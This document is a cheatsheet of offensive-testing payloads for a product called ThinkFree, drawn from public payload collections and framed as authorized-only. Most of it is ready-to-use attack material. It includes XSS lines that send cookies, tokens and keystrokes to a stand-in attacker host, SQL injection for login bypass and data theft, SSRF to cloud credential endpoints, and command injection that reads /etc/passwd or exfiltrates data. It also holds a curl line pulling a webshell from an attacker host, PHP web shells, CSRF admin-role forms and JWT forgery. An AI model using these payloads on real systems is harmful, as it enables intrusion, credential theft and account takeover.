# ThinkFree Offensive-Testing Payload Cheatsheet

> **AUTHORIZATION NOTICE — NON-NEGOTIABLE**
>
> All payloads and wordlists in this document are **exclusively** for use against ThinkFree's own
> authorized instance (local dev, staging, or explicitly approved test environments). Using any
> of these techniques against third-party systems, cloud services, APIs, or infrastructure you
> do not own or have written authorization to test is illegal under the Computer Fraud and Abuse
> Act (CFAA), the UK Computer Misuse Act, and equivalent laws globally. This document exists
> solely to validate ThinkFree's own controls and attack surface. Never use these against
> external targets.

Sources: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) (MIT),
[SecLists](https://github.com/danielmiessler/SecLists) (MIT).

---

## Table of Contents

1. [Cross-Site Scripting (XSS)](#1-cross-site-scripting-xss)
2. [SQL Injection (SQLi)](#2-sql-injection-sqli)
3. [Server-Side Request Forgery (SSRF)](#3-server-side-request-forgery-ssrf)
4. [Insecure Direct Object References (IDOR)](#4-insecure-direct-object-references-idor)
5. [Command Injection](#5-command-injection)
6. [Directory Traversal / Path Traversal](#6-directory-traversal--path-traversal)
7. [Cross-Site Request Forgery (CSRF)](#7-cross-site-request-forgery-csrf)
8. [Insecure File Upload](#8-insecure-file-upload)
9. [JSON Web Token (JWT) Attacks](#9-json-web-token-jwt-attacks)
10. [SecLists — Curated Wordlist Paths](#10-seclists--curated-wordlist-paths)

---

## 1. Cross-Site Scripting (XSS)

**What it proves:** Input is reflected or stored into the DOM without sanitization, allowing
client-side script execution — enabling cookie theft, credential harvesting, or session hijack.

### Detection / Proof-of-Concept

```html
<!-- Prefer these over alert(1) — shows actual origin scope -->
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
<script>console.log("XSS confirmed: ".concat(document.domain))</script>
```

### Common HTML Context Payloads

```html
<!-- Basic script tag -->
"><script>alert('XSS')</script>

<!-- img onerror -->
<img src=x onerror=alert(document.domain)>
"><img src=x onerror=alert(document.domain)>

<!-- SVG onload (WAF bypass) -->
<svg/onload=alert(document.domain)>
<svg id=alert(1) onload=eval(id)>

<!-- HTML5 autofocus (no click needed) -->
<input autofocus onfocus=alert(1)>
<details/open/ontoggle="alert`1`">

<!-- Pointer events (useful in div context) -->
<div onpointerover="alert(45)">MOVE HERE</div>
```

### Data Exfiltration Payloads (for impact demonstration)

```html
<!-- Cookie grab to controlled server -->
<script>new Image().src="https://ATTACKER.DOMAIN/?c="+document.cookie;</script>
<script>new Image().src="https://ATTACKER.DOMAIN/?t="+localStorage.getItem('access_token');</script>

<!-- fetch POST (no-cors) -->
<script>
  fetch('https://ATTACKER.DOMAIN', {method:'POST', mode:'no-cors', body:document.cookie});
</script>

<!-- Keylogger -->
<img src=x onerror='document.onkeypress=function(e){fetch("https://ATTACKER.DOMAIN/?k="+String.fromCharCode(e.which))},this.remove();'>
```

### URI Wrapper / Encoding Bypasses

```javascript
// javascript: URI
javascript:alert(document.domain)

// data: URI
data:text/html,<script>alert(1)</script>

// Newline bypass
java%0ascript:alert(1)

// HTML entity encoding
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)

// JS context injection (no quotes needed)
-(confirm)(document.domain)//
; alert(1);//
```

### XSS in Uppercase Output

```html
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```

---

## 2. SQL Injection (SQLi)

**What it proves:** User-supplied data is interpolated into SQL queries, enabling data extraction,
authentication bypass, or full database compromise.

### Entry Point Detection

```
'
"
;
)
-- (comment)
' OR '1'='1
1 AND 1=1
1 AND 1=2
```

### Authentication Bypass

```sql
' OR '1'='1'--
' or 1=1 limit 1 --
admin'--
' OR 1=1#
") OR ("1"="1
```

### UNION-Based (column count enumeration)

```sql
-- Find number of columns
1 ORDER BY 1--
1 ORDER BY 2--
1 ORDER BY N--   (increment until error)

-- Extract data once column count known (example: 2 columns)
1 UNION SELECT username, password FROM users--
1 UNION SELECT table_name, null FROM information_schema.tables--
```

### Blind Boolean-Based

```sql
-- True vs false response difference confirms injection
1 AND 1=1--    (true  → normal response)
1 AND 1=2--    (false → different/empty response)

-- Character extraction
1 AND ASCII(SUBSTRING(@@version,1,1))>50--
1 AND LENGTH(@@hostname)=N--
```

### Time-Based Blind

```sql
-- MySQL
1 AND SLEEP(5)--
1; SELECT SLEEP(5)--

-- PostgreSQL
1; SELECT pg_sleep(5)--

-- MSSQL
1; WAITFOR DELAY '0:0:5'--

-- Oracle
1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

### Error-Based Extraction (PostgreSQL example)

```sql
LIMIT CAST((SELECT version()) AS numeric)
-- Returns: ERROR: invalid input syntax for type numeric: "PostgreSQL 14.x..."
```

### Polyglot (tests multiple DBs simultaneously)

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### DBMS Fingerprinting

```sql
-- MySQL
conv('a',16,2)=conv('a',16,2)

-- PostgreSQL
5::int=5

-- MSSQL
@@CONNECTIONS>0

-- Oracle
ROWNUM=ROWNUM

-- SQLite
sqlite_version()=sqlite_version()
```

---

## 3. Server-Side Request Forgery (SSRF)

**What it proves:** The server fetches attacker-controlled URLs, enabling cloud metadata access,
internal network scanning, or bypass of IP-based access controls.

### Cloud Metadata Endpoints

```
http://169.254.169.254/latest/meta-data/              # AWS EC2
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/   # GCP (requires header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure
```

### Localhost Bypass Variants

```
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::]:80/
http://[::1]/
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[::ffff:127.0.0.1]
```

### IP Encoding Bypasses

```
http://2130706433/        # decimal for 127.0.0.1
http://0x7f000001/        # hex
http://0177.0.0.1/        # octal
http://127.1/             # short-form
http://127.0.1.3          # CIDR loopback range
```

### Domain-Based Bypasses

```
http://localh.st/                         # resolves to 127.0.0.1
http://127.0.0.1.nip.io/                  # nip.io passthrough
http://company.127.0.0.1.nip.io/
```

### URL Parser Confusion

```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http:127.0.0.1/
```

### Protocol Schemes (when URL scheme is controllable)

```
file:///etc/passwd
dict://localhost:6379/info         # Redis
gopher://localhost:6379/_INFO      # Redis via gopher
sftp://attacker.com:11111/
```

---

## 4. Insecure Direct Object References (IDOR)

**What it proves:** Authorization is not enforced at the object level — changing an ID parameter
grants access to another user's data.

### Numeric Increment/Decrement

```
GET /api/users/100 → try 99, 101, 102
GET /api/orders/287789 → try 287790, 287788
GET /api/invoices/1 → try 2, 3, ...
```

### ID Encoding Variants

```
# Hex
GET /api/users/0x4642d

# Base64
GET /api/profile?id=am9obi5kb2VAbWFpbC5jb20=   (john.doe@mail.com encoded)

# Unix timestamp IDs
GET /api/sessions/1695574808
```

### Weak PRNG / Predictable IDs

```
# UUID v1 — time-based, predictable if creation time known
95f6e264-bb00-11ec-8833-00155d01ef00

# MongoDB ObjectID — epoch + machine + pid + counter
5ae9b90a2c144b9def01ec37
```

### Wildcard / Mass Enumeration

```
GET /api/users/*  HTTP/1.1
GET /api/users/%  HTTP/1.1
GET /api/users/_  HTTP/1.1
```

### Request Manipulation Tricks

```
# Change HTTP method
POST /api/resource/123 → PUT /api/resource/456

# Change Content-Type
Content-Type: application/xml → Content-Type: application/json

# Wrap ID in array
{"id": 19} → {"id": [19]}

# HTTP Parameter Pollution
user_id=attacker_id&user_id=victim_id
```

---

## 5. Command Injection

**What it proves:** User input is passed to a shell without sanitization, allowing arbitrary OS
command execution.

### Basic Chain Operators

```bash
; cat /etc/passwd
&& cat /etc/passwd
|| cat /etc/passwd
| cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)
```

### Common Detection Payloads (time-safe)

```bash
; sleep 5
& sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
; ping -c 5 127.0.0.1
```

### Space-Bypass Techniques

```bash
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X
```

### Character Filter Bypasses

```bash
# Backslash split (for filters scanning whole string)
cat /et\
c/pa\
sswd

# Brace expansion (no slash needed)
{,/bin/ls,/etc}

# Tilde expansion
echo ~+   # expands to $PWD
```

### Hex Encoding Bypass

```bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### Data Exfiltration (Out-of-Band)

```bash
# DNS-based (use Burp Collaborator or interactsh)
curl https://$(cat /etc/hostname).COLLABORATOR.net
nslookup $(whoami).COLLABORATOR.net
```

### Argument Injection (when only args are controllable)

```bash
# SSH ProxyCommand
ssh '-oProxyCommand="touch /tmp/pwned"' x@x

# psql -o pipe
psql -o'|id>/tmp/pwned'

# curl write-out to webshell
curl http://ATTACKER.COM/shell.php -o webshell.php
```

---

## 6. Directory Traversal / Path Traversal

**What it proves:** File-path parameters are not canonicalized, allowing reads of arbitrary files
outside the web root (e.g., `/etc/passwd`, `.env`, app config).

### Core Sequences

```
../../../etc/passwd
..\..\..\windows\win.ini
```

### Encoding Variants (WAF/filter bypass)

```
# URL encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double URL encoded
%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode encoded
%u002e%u002e%u2215etc%u2215passwd

# Overlong UTF-8
%c0%ae%c0%ae%c0%afetc%c0%afpasswd

# Mangled (for filters that strip ../)
..././etc/passwd
....//etc/passwd
```

### Null Byte Truncation

```
../../etc/passwd%00.jpg
../../etc/passwd%00index.htm
```

### Nginx/Tomcat Confusion (`..;/`)

```
/api/..;/..;/admin/
/services/pluginscript/..;/..;/..;/getFavicon
```

### High-Value Target Files (Linux)

```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/[pid]/fd/[fd]
~/.ssh/id_rsa
/var/www/html/.env
/app/.env
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
```

### High-Value Target Files (Windows)

```
\windows\win.ini
\windows\system32\drivers\etc\hosts
\inetpub\wwwroot\web.config
\\localhost\c$\windows\win.ini    # UNC share
```

---

## 7. Cross-Site Request Forgery (CSRF)

**What it proves:** State-changing requests succeed without a valid anti-CSRF token, allowing an
attacker-controlled page to trigger actions on behalf of an authenticated ThinkFree user.

### GET-Based (no interaction)

```html
<img src="https://thinkfree.app/api/setusername?username=pwned">
```

### POST AutoSubmit (no interaction)

```html
<form id="csrf" action="https://thinkfree.app/api/setrole" method="POST">
  <input name="role" type="hidden" value="admin" />
</form>
<script>document.getElementById("csrf").submit();</script>
```

### POST with JSON Body (text/plain smuggle)

```html
<form id="CSRF_POC" action="https://thinkfree.app/api/setrole"
      enctype="text/plain" method="POST">
  <!-- Sends: {"role":"admin","padding":"="}  -->
  <input type="hidden" name='{"role":"admin","padding":"' value='"}' />
</form>
<script>document.getElementById("CSRF_POC").submit();</script>
```

### XHR Complex Request (tests CORS + preflight handling)

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://thinkfree.app/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":"admin"}');
</script>
```

### Multipart File Upload CSRF

```html
<script>
function launch(){
  const dT = new DataTransfer();
  dT.items.add(new File(["CSRF-payload"], "evil.csv"));
  document.xss[0].files = dT.files;
  document.xss.submit();
}
</script>
<form style="display:none" name="xss" method="post"
      action="https://thinkfree.app/api/upload" enctype="multipart/form-data">
  <input id="file" type="file" name="file"/>
  <input type="submit"/>
</form>
<button onclick="launch()">Go</button>
```

---

## 8. Insecure File Upload

**What it proves:** The server accepts and serves executable files when it should reject them,
enabling remote code execution or stored XSS via uploaded content.

### PHP Extension Bypasses

```
shell.php
shell.php5
shell.phtml
shell.phar
shell.php.jpg        # double extension (Apache misconfigured)
shell.jpg.php        # reverse double
shell.pHp            # case variation
shell.php%00.jpg     # null byte truncation
shell.php%0a.jpg     # newline
shell.php%20         # trailing space (Windows)
shell.php......      # trailing dots (Windows strips them)
```

### MIME / Content-Type Bypass

```
# Send Content-Type: image/jpeg while uploading a PHP file
Content-Type: image/gif
Content-Type: image/png
Content-Type: image/jpeg

# Or set it twice in the multipart body
```

### Magic Bytes Spoofing (prepend to shell content)

```
# GIF header + PHP shell
GIF89a;<?php system($_GET['cmd']); ?>

# JPG magic bytes: \xff\xd8\xff + PHP code after
# PNG magic: \x89PNG\r\n\x1a\n + PHP code
```

### Minimal PHP Web Shells

```php
<?php system($_GET['cmd']); ?>
<?=`$_GET[c]`?>
<script language="php">system($_REQUEST['cmd']);</script>
```

### Configuration File Upload (Apache)

Upload an `.htaccess` that registers a new extension as PHP:

```apache
AddType application/x-httpd-php .rce
```

Then upload `payload.rce` containing a PHP shell.

### Filename as Payload Vector

```
'"><img src=x onerror=alert(document.domain)>.jpg    # XSS via filename
../../../tmp/shell.php                                 # Path traversal in name
poc.js'(select*from(select(sleep(20)))a)+'.jpg         # SQLi in filename
; sleep 10;.jpg                                        # Command injection in name
```

### EXIF Metadata Shell

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
# Upload image.jpg, then trigger via LFI: ?file=uploads/image.jpg
```

---

## 9. JSON Web Token (JWT) Attacks

**What it proves:** Token validation is misconfigured, allowing privilege escalation or identity
spoofing by forging or manipulating JWTs without a valid secret.

### None Algorithm Attack (CVE-2015-9235)

Strip the signature and set `alg` to `none` (try all case variants):

```
# Variants to try for the alg value:
none / None / NONE / nOnE

# Manually construct:
base64url({"alg":"none","typ":"JWT"}).base64url({"sub":"admin","role":"admin"}).
# Note the trailing dot — signature is empty string
```

Using jwt_tool:

```bash
python3 jwt_tool.py <JWT> -X a
```

### Algorithm Confusion: RS256 → HS256 (CVE-2016-5431)

If the server uses RS256 but accepts HS256, sign with the **public key** as the HMAC secret:

```python
import jwt
public = open('public.pem', 'r').read()
token = jwt.encode({"sub":"admin","role":"admin"}, key=public, algorithm='HS256')
# Requires: pip install pyjwt==0.4.3
```

Using jwt_tool:

```bash
python3 jwt_tool.py <JWT> -X k -pk public.pem
```

Public key often at: `/jwks.json` or `/.well-known/jwks.json`

### Null Signature Attack (CVE-2020-28042)

```
# Send a valid header.payload with an EMPTY signature segment (trailing dot).
# Redacted example, not a real token: header={"alg":"HS256"}, payload={"sub":"admin"}.
<base64url-header>.<base64url-payload>.
```

```bash
python3 jwt_tool.py <JWT> -X n
```

### Weak Secret Brute Force

```bash
# hashcat
hashcat -a 0 -m 16500 <JWT> /path/to/wordlist.txt

# jwt_tool
python3 jwt_tool.py <JWT> -C -d /path/to/wordlist.txt
```

### `kid` Header Injection (SQL / Path Traversal)

```json
{
  "alg": "HS256",
  "kid": "../../dev/null"
}
// Sign with empty string — /dev/null is empty, so HMAC(key="") validates
```

```json
{
  "kid": "' UNION SELECT 'attacker_secret' --"
}
// Sign with 'attacker_secret' if kid is used in a SQL query to fetch the key
```

### `jku` Header Injection (Remote JWKS)

```json
{
  "alg": "RS256",
  "jku": "https://ATTACKER.COM/jwks.json"
}
// Host your own JWKS with your keypair; sign with your private key
```

---

## 10. SecLists — Curated Wordlist Paths

All paths are relative to the SecLists zip root (`SecLists-master/`).

### Common Passwords

| Path | Use For |
|------|---------|
| `Passwords/Common-Credentials/10k-most-common.txt` | Quick spray of top 10k common passwords against login forms |
| `Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt` | Broader NCSC-sourced common password spray |
| `Passwords/Common-Credentials/2025-199_most_used_passwords.txt` | Current-year most-used passwords (keep fresh) |

### Default Credentials

| Path | Use For |
|------|---------|
| `Passwords/Default-Credentials/default-passwords.csv` | Vendor default user:pass pairs for devices and services |
| `Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt` | SSH default credential pairs |
| `Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt` | Apache Tomcat manager default creds |
| `Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt` | MySQL default credential pairs |
| `Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt` | PostgreSQL default credentials |
| `Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | FTP service default credentials |

### Usernames

| Path | Use For |
|------|---------|
| `Usernames/top-usernames-shortlist.txt` | Quick username enumeration (small, high-signal list) |
| `Usernames/cirt-default-usernames.txt` | CIRT-collected default usernames across vendors |
| `Usernames/CommonAdminBase64.txt` | Common admin usernames base64-encoded (for basic-auth fuzzing) |

### Web Content Discovery

| Path | Use For |
|------|---------|
| `Discovery/Web-Content/common.txt` | General-purpose directory and file brute-force (fast, ~4700 entries) |
| `Discovery/Web-Content/raft-medium-directories.txt` | RAFT medium directory list — broad coverage, good signal/noise |
| `Discovery/Web-Content/raft-medium-files.txt` | RAFT medium file list — discovers backup files, configs, logs |
| `Discovery/Web-Content/raft-large-words.txt` | RAFT large general-purpose wordlist for thorough scans |
| `Discovery/Web-Content/api/api-endpoints.txt` | REST API endpoint names for fuzzing `/api/<endpoint>` paths |
| `Discovery/Web-Content/api/api-seen-in-wild.txt` | API paths observed in real-world applications |
| `Discovery/Web-Content/common-api-endpoints-mazen160.txt` | Curated common API endpoints (admin, health, metrics, docs) |

### Fuzzing — Vulnerability-Specific

| Path | Use For |
|------|---------|
| `Fuzzing/LFI/LFI-Jhaddix.txt` | LFI/path traversal payloads — broad coverage Linux + Windows |
| `Fuzzing/LFI/Linux/LFI-gracefulsecurity-linux.txt` | Linux-specific sensitive file paths for LFI confirmation |
| `Fuzzing/XSS/Polyglots/XSS-Polyglots.txt` | XSS polyglot payloads that fire in multiple contexts |
| `Fuzzing/Databases/SQLi/Generic-SQLi.txt` | Generic SQLi detection strings for parameter fuzzing |
| `Fuzzing/Databases/SQLi/sqli.auth.bypass.txt` | SQLi authentication bypass payloads |
| `Fuzzing/Databases/SQLi/SQLi-Polyglots.txt` | SQLi polyglots that probe multiple DBMS simultaneously |
| `Fuzzing/Metacharacters.fuzzdb.txt` | Shell metacharacters for command injection detection |
| `Fuzzing/JSON.Fuzzing.txt` | Malformed JSON values for fuzzing JSON API inputs |

---

*Cheatsheet built from PayloadsAllTheThings (swisskyrepo) and SecLists (danielmiessler). Payloads
are representative canonical examples, not exhaustive dumps. Always verify behavior against
ThinkFree's own test instance only.*
